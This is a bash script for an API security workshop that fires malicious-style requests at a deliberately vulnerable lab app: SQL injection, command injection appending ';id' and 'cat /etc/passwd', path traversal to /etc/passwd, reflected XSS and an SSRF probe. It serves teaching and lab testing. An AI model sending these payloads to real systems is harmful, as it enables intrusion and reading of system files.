#!/usr/bin/env bash
# Trigger intentionally malicious-style requests (for API Security / workshop demos).
# The app is vulnerable by design; only use against your own lab instance.
# Usage:
#   ./script/call-workshop-api-malicious.sh
#   ./script/call-workshop-api-malicious.sh http://YOUR_EC2_PUBLIC_IP
#   BASE_URL=http://54.x.x.x ./script/call-workshop-api-malicious.sh

set -euo pipefail

BASE_URL="${1:-${BASE_URL:-http://127.0.0.1:3000}}"
BASE_URL="${BASE_URL%/}"

echo "Base URL: ${BASE_URL}"
echo ""

preflight() {
  if curl -sS -f -o /dev/null --connect-timeout 5 --max-time 12 "${BASE_URL}/health" 2>/dev/null; then
    return 0
  fi
  echo "ERROR: Cannot reach ${BASE_URL} (connection timed out or refused)."
  echo ""
  echo "Common fixes:"
  echo "  1) Confirm the EC2 public IP; it may have changed."
  echo "  2) Security group: allow inbound TCP 80 (or 3000) from your laptop's public IP."
  MY_IP=$(curl -sS --max-time 5 https://checkip.amazonaws.com 2>/dev/null || echo "unknown")
  echo "  3) Your current public IP: ${MY_IP}"
  echo ""
  echo "  aws ec2 authorize-security-group-ingress --region REGION --group-id sg-xxxxxxxx \\"
  echo "    --protocol tcp --port 80 --cidr ${MY_IP}/32"
  exit 1
}

hit() {
  local name="$1"
  local path="$2"
  local code
  code=$(curl -sS -o /dev/null -w "%{http_code}" --connect-timeout 5 --max-time 30 -g "${BASE_URL}${path}" 2>/dev/null || true)
  if [ -z "${code}" ] || [ "${code}" = "000" ]; then
    printf "  %-28s FAIL  %s\n" "${name}" "${path}"
  else
    printf "  %-28s %s  %s\n" "${name}" "${code}" "${path}"
  fi
}

preflight

echo "=== Malicious-style API calls ==="
hit "SQLi (OR 1=1)" "/api/vuln/sql?id=1%20OR%201=1"
hit "SQLi (quoted)" "/api/vuln/sql?id=1%27%20OR%20%271%27%3D%271"
hit "Cmd injection (ping)" "/api/vuln/command/ping?host=127.0.0.1%3Bid"
hit "Cmd injection (nslookup)" "/api/vuln/command/nslookup?domain=localhost%3Bcat%20/etc/passwd"
hit "Path traversal" "/api/vuln/path?name=../../../etc/passwd"
hit "Reflected XSS" "/api/vuln/xss?q=%3Cscript%3Ealert(1)%3C/script%3E"
hit "SSRF" "/api/vuln/ssrf?url=http%3A%2F%2F127.0.0.1%3A3000%2Fhealth"
echo ""
echo "Done."
